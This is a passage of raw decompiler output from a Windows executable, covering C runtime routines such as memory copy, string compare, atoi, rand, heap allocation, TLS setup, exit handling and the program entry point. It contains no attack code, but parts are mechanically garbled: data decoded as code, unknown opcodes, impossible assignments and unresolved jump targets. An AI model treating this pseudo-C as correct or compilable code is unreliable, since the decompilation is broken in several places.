            asm("rep movsd");
            asm("cld");
            goto *(edx * 4 + 0x40aa40)[L0040aa50, L0040aa58, L0040aa68, L0040aa7c, ]goto ( *(edx * 4 + 0x40aa40));
        }
L0040a920:
        ecx = ~ecx;
        goto *(ecx * 4 + 0x40a9f0)[L0040aa37, ]goto ( *(ecx * 4 + 0x40a9f0));
    }
    eax = edi;
    edx = 3;
    if(ecx >= 4) {
        eax = eax & 3;
        ecx = ecx - eax;
        goto ( *(eax * 4 + 0x40a948));
    }
    goto *(ecx * 4 + 0x40aa40)[L0040aa50, L0040aa58, L0040aa68, L0040aa7c, ]goto ( *(ecx * 4 + 0x40aa40));
    (restore)eax;
    eax & -1451753408;
    eax = eax + 1;
    *(eax + -1979694935) = *(eax + -1979694935) + ah;
    esi = esi + 1;
    esp = esp + *ebx;
    asm("ror dword [eax+0xc14e0347],1");
    goto Lf9c3f869;
    *(edx - 74) = *(edx - 74) | dh;
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x40aa40)[L0040aa50, L0040aa58, L0040aa68, L0040aa7c, ]goto ( *(edx * 4 + 0x40aa40));
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    al = *(esi + 2);
    ecx = ecx >> 2;
    *(edi + 2) = al;
    esi = esi - 2;
    edi = edi - 2;
    if(ecx < 8) {
        goto L0040a920;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x40aa40)[L0040aa50, L0040aa58, L0040aa68, L0040aa7c, ]goto ( *(edx * 4 + 0x40aa40));
    al = *(esi + 3);
    edx = edx & ecx;
    *(edi + 3) = al;
    al = *(esi + 2);
    *(edi + 2) = al;
    al = *(esi + 1);
    ecx = ecx >> 2;
    *(edi + 1) = al;
    esi = esi - 3;
    edi = edi - 3;
    if(ecx < 8) {
        goto L0040a920;
    }
    asm("std");
    asm("rep movsd");
    asm("cld");
    goto *(edx * 4 + 0x40aa40)[L0040aa50, L0040aa58, L0040aa68, L0040aa7c, ]goto ( *(edx * 4 + 0x40aa40));
    asm("hlt");
    eax & -1443102656;
    *(edx + ebp * 4) = *(edx + ebp * 4) + al;
    *(edx + ebp * 4) = *(edx + ebp * 4) + cl;
    *(edx + ebp * 4) = *(edx + ebp * 4) + dl;
    *(edx + ebp * 4) = *(edx + ebp * 4) + bl;
    *(edx + ebp * 4) = *(edx + ebp * 4) + eax + 1 + 1 + 1 + 1 + 1;
    *edi = *edi + dh;
    *edi = eax + 1 + 1 + 1 + 1 + 1 + 1;
    edi = edi + 1;
    eax = eax + 1;
    *(ebx + -1994617276) = *(ebx + -1994617276) + cl;
    esp = esp + 1;
    asm("Unknown opcode 0x8f");
    asm("sbb al,0x8b");
    esp = esp + 1;
    ds = *eax;
    *(edi + ecx * 4 + 24) = eax;
    *(edi + ecx * 4 + 20) = *(esi + ecx * 4 + 20);
    *(edi + ecx * 4 + 16) = *(esi + ecx * 4 + 16);
    *(edi + ecx * 4 + 12) = *(esi + ecx * 4 + 12);
    *(edi + ecx * 4 + 8) = *(esi + ecx * 4 + 8);
    *(edi + ecx * 4 + 4) = *(esi + ecx * 4 + 4);
    eax = ecx * 4;
    esi = esi + eax;
    edi = edi + eax;
    goto *(edx * 4 + 0x40aa40)[L0040aa50, L0040aa58, L0040aa68, L0040aa7c, ]goto ( *(edx * 4 + 0x40aa40));
    esp = ebp;
    return(A8);
    *(edi + 3) = *(esi + 3);
    esp = ebp;
    return(A8);
    *(edi + 3) = *(esi + 3);
    *(edi + 2) = *(esi + 2);
    esp = ebp;
    return(A8);
    *(edi + 3) = *(esi + 3);
    *(edi + 2) = *(esi + 2);
    *(edi + 1) = *(esi + 1);
    esp = ebp;
    return(A8);
}

/*	Procedure: 0x0040AA95 - 0x0040AAA2
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AA95(A4)
/* unknown */ void  A4;
{



    return(L0040AFE8(A4, 1));
}

/*	Procedure: 0x0040AAB0 - 0x0040AB33
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AAB0(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    edx = A4;
    ecx = A8;
    if(!(edx & 3)) {
L0040aac0:
        do {
            eax = *edx;
            if(al != *ecx) {
                goto L0040aaf4;
            }
            if(al == 0) {
                break;
            }
            if(ah != *(ecx + 1)) {
                goto L0040aaf4;
            }
            if(ah == 0) {
                break;
            }
            eax = eax >> 16;
            if(al != *(ecx + 2)) {
                goto L0040aaf4;
            }
            if(al == 0) {
                break;
            }
            if(ah != *(ecx + 3)) {
                goto L0040aaf4;
            }
            ecx = ecx + 4;
            edx = edx + 4;
        } while(ah != 0);
L0040aaf0:
        return(0);
L0040aaf4:
        asm("sbb eax,eax");
        return((eax << 1) + 1);
    }
    if(!(edx & 1)) {
        al = *edx;
        edx = edx + 1;
        if(al != *ecx) {
            goto L0040aaf4;
        }
        ecx = ecx + 1;
        if(al == 0) {
            goto L0040aaf0;
        }
        if(edx & 2) {
            goto L0040aac0;
        }
    }
    ax = *edx;
    edx = edx + 2;
    if(al != *ecx) {
        goto L0040aaf4;
    }
    if(al == 0) {
        goto L0040aaf0;
    }
    if(ah != *(ecx + 1)) {
        goto L0040aaf4;
    }
    if(ah == 0) {
        goto L0040aaf0;
    }
    ecx = ecx + 2;
    goto L0040aac0;
}

/*	Procedure: 0x0040AB34 - 0x0040AB3E
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AB34(A4)
/* unknown */ void  A4;
{



    return(L0040B062(A4));
}

/*	Procedure: 0x0040AB3F - 0x0040ABC9
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 16
 */

L0040AB3F(A14)
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    for(edi = A14; 1; edi = edi + 1) {
        if(*L004126B4 <= 1) {
            eax = *edi & 255;
            eax = *( *L004124A8 + eax * 2) & 8;
        } else {
            eax = L0040B0AA( *edi & 255, 8);
        }
        if(eax == 0) {
            break;
        }
    }
    esi = *edi & 255;
    edi = edi + 1;
    ebp = esi;
    if(esi == 45 || esi == 43) {
        esi = *edi & 255;
        edi = edi + 1;
    }
    for(ebx = 0; 1; edi = edi + 1) {
        if(*L004126B4 <= 1) {
            eax = *L004124A8;
            eax = *(eax + esi * 2) & 4;
        } else {
            eax = L0040B0AA(esi, 4);
        }
        if(eax == 0) {
            break;
        }
        ebx = esi + (ebx + ebx * 4) * 2 - 48;
        esi = *edi & 255;
    }
    eax = ebx;
    if(ebp == 45) {
        eax = ~eax;
    }
}

/*	Procedure: 0x0040ABCA - 0x0040ABD4
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040ABCA(A4)
/* unknown */ void  A4;
{



    return(L0040AB3F(A4));
}

/*	Procedure: 0x0040ABD5 - 0x0040AC52
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L0040ABD5(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;



    L0040B248();
    edx = *L0041AEF0;
    ecx = *L0041AEEC;
    if(L0040B3AC( *L0041AEF0) < ecx - edx + 4) {
        (save)edx;
        (save)L0040B3AC() + 16;
        (save) *L0041AEF0;
        A8 = L0040B274();
        esp = esp + 12;
        if(A8 == 0) {
            esi = 0;
            goto L0040ac4a;
        }
        *L0041AEF0 = A8;
        ecx = A8 + ( *L0041AEEC - *L0041AEF0 >> 2) * 4;
        *L0041AEEC = ecx;
    }
    *ecx = A8;
    *L0041AEEC = *L0041AEEC + 4;
    esi = *ecx;
L0040ac4a:
    L0040B251();
    return(esi);
}

stack space not deallocated on return
/*	Procedure: 0x0040AC53 - 0x0040ACAF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AC53(A4)
/* unknown */ void  A4;
{



    eax = ~(L0040ABD5(A4));
    asm("sbb eax,eax");
    return(~eax - 1);
    eax = L0040AFD6(128);
    *L0041AEF0 = eax;
    if(eax == 0) {
        L0040AF8D(24);
        eax = *L0041AEF0;
    }
    *eax = 0;
    eax = *L0041AEF0;
    *L0041AEEC = eax;
    return(*L0041AEEC);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    eax = edx - 1;
    (restore)ebx;
}

/* DEST BLOCK NOT FOUND: 0040accd -> 0040aca0 */
stack space not deallocated on return
/*	Procedure: 0x0040ACB0 - 0x0040AD6B
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040ACB0(A8)
/* unknown */ void  A8;
{



    eax = A8 & 255;
    (save)ebx;
    ebx = eax;
    eax = eax << 8;
    edx = A8;
    if(!(edx & 3)) {
L0040acc8:
        cl = *edx;
        edx = edx + 1;
        if(cl == bl) {
            goto L0040aca0;
        }
        if(cl == 0) {
            goto L0040ad24;
        }
        if(edx & 3) {
            goto L0040acc8;
        }
    }
    ebx = ebx | eax;
    (save)edi;
    eax = ebx;
    (save)esi;
    ebx = ebx << 16 | eax;
L0040ace6:
    ecx = *edx;
    eax = ecx;
    ecx = ecx ^ ebx;
    esi = 2130640639 + eax;
    edi = 2130640639 + ecx;
    ecx = ecx ^ -1;
    eax = eax ^ -1;
    ecx = ecx ^ edi;
    eax = eax ^ esi;
    edx = edx + 4;
    if(!(ecx = ecx & -2130640640)) {
        if((eax = eax & -2130640640) || !(eax = eax & 16843008) && (esi = esi & -2147483648)) {
            goto L0040ace6;
        }
L0040ad22:
        (restore)esi;
        (restore)edi;
L0040ad24:
        (restore)ebx;
        return(0);
    }
    eax = *(edx - 4);
    if(al != bl) {
        if(al == 0) {
            goto L0040ad22;
        }
        if(ah != bl) {
            if(ah == 0) {
                goto L0040ad22;
            }
            eax = eax >> 16;
            if(al != bl) {
                if(al == 0) {
                    goto L0040ad22;
                }
                if(ah != bl) {
                    if(ah == 0) {
                        goto L0040ad22;
                    }
                    goto L0040ace6;
                }
                (restore)esi;
                (restore)edi;
                eax = edx - 1;
                (restore)ebx;
                return;
            }
            eax = edx - 2;
            (restore)esi;
            (restore)edi;
            (restore)ebx;
            return;
        }
        eax = edx - 3;
        (restore)esi;
        (restore)edi;
        (restore)ebx;
        return;
    }
    eax = edx - 4;
    (restore)esi;
    (restore)edi;
    (restore)ebx;
}

/*	Procedure: 0x0040AD6C - 0x0040AD78
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AD6C(A4)
/* unknown */ void  A4;
{



    eax = L0040B458();
    *(eax + 20) = A4;
}

/*	Procedure: 0x0040AD79 - 0x0040AD9A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AD79()
{



    eax = L0040B458();
    ecx = *(eax + 20);
    214013 = ecx * ecx;
    ecx = ecx + 2531011;
    *(eax + 20) = ecx;
    return(*(eax + 20) >> 16 & 32767);
}

/*	Procedure: 0x0040AD9B - 0x0040AD9F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AD9B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040ADA0 - 0x0040ADD9
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L0040ADA0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;



    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    for(edx = Ac; *edx != 0; asm("bts [esp],eax");) {
        edx = edx + 1;
    }
    esi = A8;
    do {
        if(*esi == 0) {
            goto L0040add4;
        }
        asm("bt [esp],eax");
    } while(esi = esi + 1);
    eax = esi - 1;
L0040add4:
    esp = esp + 32;
}

/*	Procedure: 0x0040ADDA - 0x0040ADDF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040ADDA()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x0040ADE0 - 0x0040AE84
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0040ADE0(A4, A8, Ac)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = Ac;
    (save)ebx;
    if(eax != 0) {
        edx = A4;
        ebx = A8 & 255;
        if(!(edx & 3)) {
            do {
                cl = *edx;
                cl = cl ^ bl;
                if(edx = edx + 1) {
                    goto L0040ae6e;
                }
                if(eax = eax - 1) {
                    goto L0040ae33;
                }
            } while(edx & 3);
        }
        if(!(eax = eax - 4)) {
            (save)edi;
            edi = ebx;
            ebx = (ebx << 8) + edi;
            edi = ebx;
            ebx = (ebx << 16) + edi;
            goto L0040ae3a;
L0040ae23:
            (restore)edi;
        }
        if(!(eax = eax + 4)) {
            do {
                cl = *edx;
                cl = cl ^ bl;
                if(edx = edx + 1) {
                    goto L0040ae6e;
                }
            } while(eax = eax - 1);
        }
    }
L0040ae33:
    (restore)ebx;
    return;
L0040ae3a:
    do {
        ecx = *edx ^ ebx;
        edi = 2130640639 + ecx;
        ecx = ecx ^ -1 ^ edi;
        edx = edx + 4;
        if(!(ecx = ecx & -2130640640)) {
            cl = *(edx - 4) ^ bl;
            == ? L0040ae7f : ;
            ch = ch ^ bl;
            == ? L0040ae79 : ;
            cl = ecx >> 16 ^ bl;
            == ? L0040ae73 : ;
            ch = ch ^ bl;
            == ? L0040ae6d : ;
        }
    } while(!(eax = eax - 4));
    goto L0040ae23;
    (restore)edi;
L0040ae6e:
    eax = edx - 1;
    (restore)ebx;
    return;
    eax = edx - 2;
    (restore)edi;
    (restore)ebx;
    return;
    eax = edx - 3;
    (restore)edi;
    (restore)ebx;
    return;
    eax = edx - 4;
    (restore)edi;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x0040AE85 - 0x0040AF81
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4253184;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 88;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    edx = *__imp__GetVersion() & 255;
    *L0041A844 = edx;
    ecx = eax & 255;
    *L0041A840 = ecx;
    *L0041A83C = ( *L0041A840 << 8) + *L0041A844;
    *L0041A838 = eax >> 16;
    if(L0040BC83(1) == 0) {
        L0040AFB2(28);
    }
    if(L0040B3F1() == 0) {
        L0040AFB2(16);
    }
    esi = 0;
    *(ebp - 4) = 0;
    L0040BAC7();
    *L0041AEF8 = *__imp__GetCommandLineA();
    *L0041A828 = L0040B995();
    L0040B748();
    L0040B68F();
    L0040B154();
    *(ebp - 48) = esi;
    (save)ebp - 92;
    *__imp__GetStartupInfoA();
    *(ebp - 100) = L0040B637();
    eax = !( *(ebp - 48) & 1) ? *(ebp - 44) & 65535 : 10;
    (save)eax;
    eax = L0040494F( *__imp__GetModuleHandleA(), esi, esi, *(ebp - 100));
    *(ebp - 96) = eax;
    (save) *(ebp - 96);
    L0040B181();
    eax = *(ebp - 20);
    ecx = *( *eax);
    *(ebp - 104) = ecx;
    return(L0040B4BF( *(ebp - 104), eax));
}

/*	Procedure: 0x0040AF82 - 0x0040AF8C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AF82()
{



    esp = *(ebp - 24);
    (save) *(ebp - 104);
    L0040B192();
}

/*	Procedure: 0x0040AF8D - 0x0040AFB1
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AF8D(A4)
/* unknown */ void  A4;
{



    if(*L0041A830 == 1) {
        L0040BCBF();
    }
    L0040BCF8();
    return(*L004124a0(255, A4));
}

stack space not deallocated on return
/*	Procedure: 0x0040AFB2 - 0x0040AFD5
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AFB2(A4)
/* unknown */ void  A4;
{



    if(*L0041A830 == 1) {
        L0040BCBF();
    }
    L0040BCF8(A4);
    return(*__imp__ExitProcess(255));
}

/*	Procedure: 0x0040AFD6 - 0x0040AFE7
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AFD6(A4)
/* unknown */ void  A4;
{



    return(L0040AFE8(A4, *L0041A984));
}

/* DEST BLOCK NOT FOUND: 0040affb -> 0040b013 */
/* DEST BLOCK NOT FOUND: 0040b001 -> 0040b013 */
/*	Procedure: 0x0040AFE8 - 0x0040B013
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040AFE8(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    if(A4 <= -32) {
        do {
            if(L0040B014(A4) != 0 || A8 == eax) {
                goto L0040b013;
            }
        } while(L0040BE4B(A4) != 0);
    }
    eax = 0;
L0040b013:
}

/*	Procedure: 0x0040B014 - 0x0040B061
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B014(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;



    esi = A8;
    (save)edi;
    if(esi <= *L004128C8) {
        L0040BE8F();
        edi = L0040C299();
        L0040BEF0(9, esi, 9);
        if(edi == 0) {
            goto L0040b043;
        }
        eax = edi;
    } else {
L0040b043:
        if(esi == 0) {
            esi = 1;
        }
        eax = *__imp__HeapAlloc( *L0041ADC0, 0, esi + 15 & -16);
    }
    (restore)edi;
}

/*	Procedure: 0x0040B062 - 0x0040B0A9
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B062(A8)
/* unknown */ void  A8;
{



    if(A8 != 0) {
        (save)9;
        L0040BE8F();
        eax = L0040BF43(A8);
        (restore)ecx;
        if(eax != 0) {
            L0040BF6E();
            return(L0040BEF0(9, eax, A8));
        }
        L0040BEF0(9);
        eax = *__imp__HeapFree( *L0041ADC0, 0, A8);
    }
}

/*	Procedure: 0x0040B0AA - 0x0040B11E
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B0AA(A8, Aa, Ac)
/* unknown */ void  A8;
/* unknown */ void  Aa;
/* unknown */ void  Ac;
{



    (save)ecx;
    eax = A8;
    if(eax + 1 <= 256) {
        eax = *( *L004124A8 + eax * 2) & 65535;
    } else {
        ecx = eax;
        (save)esi;
        ecx = ecx >> 8;
        (restore)esi;
        if(!( *( *L004124A8 + (cl & 255) * 2 + 1) & 128)) {
            *(ebp - 2) = 0;
            *(ebp - 4) = cl;
            *(ebp - 3) = al;
            (save)2;
        } else {
            *(ebp - 3) = 0;
            *(ebp - 4) = al;
            (save)1;
        }
        (restore)eax;
        eax = L0040CA44(1, ebp - 4, eax, & Aa, 0, 0, 1);
        if(eax == 0) {
            return;
        }
        eax = Aa & 65535;
    }
    eax = eax & Ac;
    esp = ebp;
}

/*	Procedure: 0x0040B11F - 0x0040B153
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B11F(A4, A8, Ac, A10)
/* unknown */ void  A4;
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    asm("int3");
    eax = A8;
    if(!(Ac = A10 | eax)) {
        eax = A4;
        asm("mul ecx");
        return;
    }
    (save)ebx;
    asm("mul ecx");
    ebx = eax;
    eax = A4;
    asm("mul dword [esp+0x14]");
    ebx = ebx + eax;
    eax = A4;
    asm("mul ecx");
    edx = edx + ebx;
    (restore)ebx;
}

/*	Procedure: 0x0040B154 - 0x0040B180
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B154()
{



    eax = *L0041AEF4;
    if(eax != 0) {
        *eax();
    }
    L0040B25A();
    return(L0040B25A(0x410000, 0x41000c, 0x410010, 0x41001c));
}

/*	Procedure: 0x0040B181 - 0x0040B191
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B181(A4)
/* unknown */ void  A4;
{



    return(L0040B1A3(A4, 0, 0));
}

/*	Procedure: 0x0040B192 - 0x0040B1A2
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B192(A4)
/* unknown */ void  A4;
{



    return(L0040B1A3(A4, 1, 0));
}

stack space not deallocated on return
/*	Procedure: 0x0040B1A3 - 0x0040B247
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B1A3(Ac, A10, A18)
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A18;
{
	/* unknown */ void  edi;



    L0040B248();
    edi = 1;
    if(*L0041A874 == 1) {
        (save)Ac;
        (save) *__imp__GetCurrentProcess();
        *__imp__TerminateProcess();
    }
    (save)ebx;
    *L0041A870 = edi;
    *L0041A86C = A18;
    if(A10 == 0) {
        eax = *L0041AEF0;
        if(eax != 0) {
            (save)esi;
            esi = *L0041AEEC - 4;
            if(esi >= eax) {
                do {
                    eax = *esi;
                    if(eax != 0) {
                        *eax();
                    }
                    esi = esi - 4;
                } while(esi >= *L0041AEF0);
            }
            (restore)esi;
        }
        L0040B25A(0x410020, 0x410024);
    }
    L0040B25A(0x410028, 0x41002c);
    (restore)ebx;
    if(ebx != 0) {
        return(L0040B251());
    }
    *L0041A874 = edi;
    return(*__imp__ExitProcess(Ac));
}

/*	Procedure: 0x0040B248 - 0x0040B250
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B248()
{



    return(L0040BE8F(13));
}

/*	Procedure: 0x0040B251 - 0x0040B259
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B251()
{



    return(L0040BEF0(13));
}

/*	Procedure: 0x0040B25A - 0x0040B273
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B25A(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;



    for(esi = A8; esi < Ac; esi = esi + 4) {
        eax = *esi;
        if(eax != 0) {
            eax = *eax();
        }
    }
}

/*	Procedure: 0x0040B274 - 0x0040B3AB
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B274(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)esi;
    (save)edi;
    if(A8 == 0) {
        eax = L0040AFD6(Ac);
    } else {
        esi = Ac;
        if(esi == 0) {
            L0040B062(A8);
L0040b29d:
            eax = 0;
        } else {
            do {
                edi = 0;
                if(esi <= -32) {
                    (save)9;
                    L0040BE8F();
                    eax = L0040BF43(A8);
                    Ac = eax;
                    (restore)ecx;
                    if(eax == 0) {
                        L0040BEF0(9);
                        if(esi == 0) {
                            esi = 1;
                        }
                        esi = esi + 15 & -16;
                        (save)esi;
                        (save)A8;
                        (save)0;
                        (save) *L0041ADC0;
                        edi = *__imp__HeapReAlloc();
                    } else {
                        if(esi <= *L004128C8) {
                            if(L0040C74E(eax, A8, esi) != 0) {
                                goto L0040b2e0;
                            }
                            edi = L0040C299(esi);
                            if(edi != 0) {
                                eax = *(A8 - 4) - 1;
                                if(eax >= esi) {
                                    eax = esi;
                                }
                                L0040A760(edi, A8, eax);
                                (save)A8;
                                (save)Ac;
                                L0040BF6E();
                                esp = esp + 20;
                                goto L0040b30f;
L0040b2e0:
                                edi = A8;
L0040b30f:
                                if(edi != 0) {
                                    goto L0040b353;
                                }
                            }
                        }
                        if(esi == 0) {
                            esi = 1;
                        }
                        esi = esi + 15 & -16;
                        (save)esi;
                        (save)0;
                        (save) *L0041ADC0;
                        edi = *__imp__HeapAlloc();
                        if(edi != 0) {
                            eax = *(A8 - 4) - 1;
                            if(eax >= esi) {
                                eax = esi;
                            }
                            L0040A760(edi, A8, eax);
                            (save)A8;
                            (save)Ac;
                            L0040BF6E();
                            esp = esp + 20;
                        }
L0040b353:
                        L0040BEF0(9);
                    }
                    if(edi != 0) {
                        goto L0040b3a5;
                    }
                }
                if(*L0041A984 == 0) {
                    goto L0040b3a5;
                }
            } while(L0040BE4B(esi) != 0);
            goto L0040b29d;
L0040b3a5:
            eax = edi;
        }
    }
    (restore)edi;
    (restore)esi;
}

/*	Procedure: 0x0040B3AC - 0x0040B3F0
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B3AC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;



    (save)9;
    L0040BE8F();
    esi = A8;
    (restore)ecx;
    if(L0040BF43(esi) != 0) {
        esi = *(esi - 4) - 9;
        L0040BEF0(9);
    } else {
        L0040BEF0(9);
        esi = *__imp__HeapSize( *L0041ADC0, 0, esi);
    }
    return(esi);
}

stack space not deallocated on return
/*	Procedure: 0x0040B3F1 - 0x0040B444
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040B3F1()
{
	/* unknown */ void  esi;



    L0040BE66();
    eax = *__imp__TlsAlloc();
    *L004126C0 = eax;
    if(eax != -1) {
        (save)116;
        esi = L0040CB8D(1);
        (restore)ecx;
        if(esi != 0) {
            (save)esi;
            (save) *L004126C0;
            if(*__imp__TlsSetValue() != 0) {
                L0040B445(esi);
                *(esi + 4) = *(esi + 4) | -1;
                (save)1;
                *esi = *__imp__GetCurrentThreadId();
                (restore)eax;
                return;
            }
        }
    }
    return(0);
}

/*	Procedure: 0x0040B445 - 0x0040B457
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B445(A4)
/* unknown */ void  A4;
{



    *(A4 + 80) = 0x4126c8;
    *(A4 + 20) = 1;
}

stack space not deallocated on return
/*	Procedure: 0x0040B458 - 0x0040B4BE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L0040B458()
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    (save) *L004126C0;
    edi = *__imp__GetLastError();
    esi = *__imp__TlsGetValue();
    if(esi == 0) {
        (save)116;
        esi = L0040CB8D(1);
        (restore)ecx;
        if(esi != 0) {
            (save)esi;
            (save) *L004126C0;
            if(*__imp__TlsSetValue() == 0) {
                goto L0040b4ab;
            }
            L0040B445(esi);
            *(esi + 4) = *(esi + 4) | -1;
            *esi = *__imp__GetCurrentThreadId();
        } else {
L0040b4ab:
            L0040AF8D(16);
        }
    }
    *__imp__SetLastError(edi);
    return(esi);
}

/*	Procedure: 0x0040B4BF - 0x0040B5FC
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B4BF(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save)ecx;
    (save)A8;
    (save)esi;
    esi = L0040B458();
    (save) *(esi + 80);
    eax = L0040B5FD(A8);
    (restore)ecx;
    if(eax != 0) {
        A8 = *(eax + 8);
        A8 = A8;
        if(A8 == 0) {
            goto L0040b5f0;
        }
        if(A8 == 5) {
            *(eax + 8) = 0;
            eax = 1;
        } else {
            if(A8 != 1) {
                *(ebp - 4) = *(esi + 84);
                *(esi + 84) = Ac;
                ecx = *(eax + 4);
                if(ecx == 8) {
                    edx = *L00412740;
                    (save)edi;
                    if(edx < *L00412744 + edx) {
                        ecx = edx + edx * 2 << 2;
                        do {
                            edi = *(esi + 80);
                            ecx = ecx + 12;
                            *(ecx + edi - 4) = 0;
                            edx = edx + 1;
                        } while(edx < *L00412744 + *L00412740);
                    }
                    eax = *eax;
                    edi = *(esi + 88);
                    if(eax == -1073741682) {
                        *(esi + 88) = 131;
                    } else {
                        if(eax == -1073741680) {
                            *(esi + 88) = 129;
                        } else {
                            if(eax == -1073741679) {
                                *(esi + 88) = 132;
                            } else {
                                if(eax == -1073741677) {
                                    *(esi + 88) = 133;
                                } else {
                                    if(eax == -1073741683) {
                                        *(esi + 88) = 130;
                                    } else {
                                        if(eax == -1073741681) {
                                            *(esi + 88) = 134;
                                        } else {
                                            if(eax == -1073741678) {
                                                *(esi + 88) = 138;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    (save) *(esi + 88);
                    *A8(8);
                    *(esi + 88) = edi;
                    (restore)ecx;
                    (restore)edi;
                } else {
                    *(eax + 8) = 0;
                    *A8(ecx);
                }
                eax = *(ebp - 4);
                *(esi + 84) = eax;
            }
            eax = eax | -1;
        }
    } else {
L0040b5f0:
        eax = *__imp__UnhandledExceptionFilter(Ac);
    }
    (restore)esi;
    (restore)A8;
}

/*	Procedure: 0x0040B5FD - 0x0040B636
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B5FD(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    ecx = *L0041274C;
    (save)A4;
    (save)edi;
    eax = A8;
    if(*A8 != A4) {
        edi = A8 + (ecx + ecx * 2) * 4;
        do {
            eax = eax + 12;
            if(eax >= edi) {
                break;
            }
        } while(*eax != A4);
    }
    if(eax >= A8 + (ecx + ecx * 2) * 4 || *eax != A4) {
        eax = 0;
    }
    (restore)edi;
    (restore)A4;
}

/*	Procedure: 0x0040B637 - 0x0040B68E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040B637()
{



    if(*L0041AEE8 == 0) {
        L0040D034();
    }
    (save)esi;
    esi = *L0041AEF8;
    al = *esi;
    if(al == 34) {
        while(1) {
            al = *(esi + 1);
            esi = esi + 1;
            if(al == 34 || al == 0) {
                break;
            }
            if(L0040CC1A(al & 255) == 0) {
                continue;
            }
            esi = esi + 1;
        }
        if(*esi == 34) {
L0040b674:
            esi = esi + 1;
        }
    } else {
        if(al > 32) {
            do {
                esi = esi + 1;
            } while(*esi > 32);
        }
    }
    al = *esi;
    if(al != 0 && al <= 32) {
        goto L0040b674;
    }
    eax = esi;
    (restore)esi;
}

/*	Procedure: 0x0040B68F - 0x0040B747
